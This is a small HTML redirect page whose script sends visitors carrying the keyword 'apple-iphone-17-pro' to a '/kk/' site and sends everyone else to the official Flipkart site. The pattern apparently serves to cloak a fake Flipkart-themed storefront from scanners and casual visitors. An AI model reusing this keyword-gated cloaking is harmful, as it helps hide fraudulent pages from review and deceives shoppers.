<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
      (function() {
        const VERIFY_KEYWORD = 'apple-iphone-17-pro';
        const currentUrl = window.location.href;
        const REPO_ROOT = '/kk/';

        // Check if the requested link has the verification keyword
        if (currentUrl.includes(VERIFY_KEYWORD)) {
          // Store the full original path + search params in sessionStorage
          sessionStorage.setItem('redirect_path', window.location.pathname + window.location.search + window.location.hash);
          // Redirect cleanly to repo root (index.html)
          window.location.replace(REPO_ROOT);
        } else {
          // If keyword is missing, redirect to official Flipkart
          window.location.replace('https://www.flipkart.com');
        }
      })();
    </script>
</head>
<body>
</body>
</html>
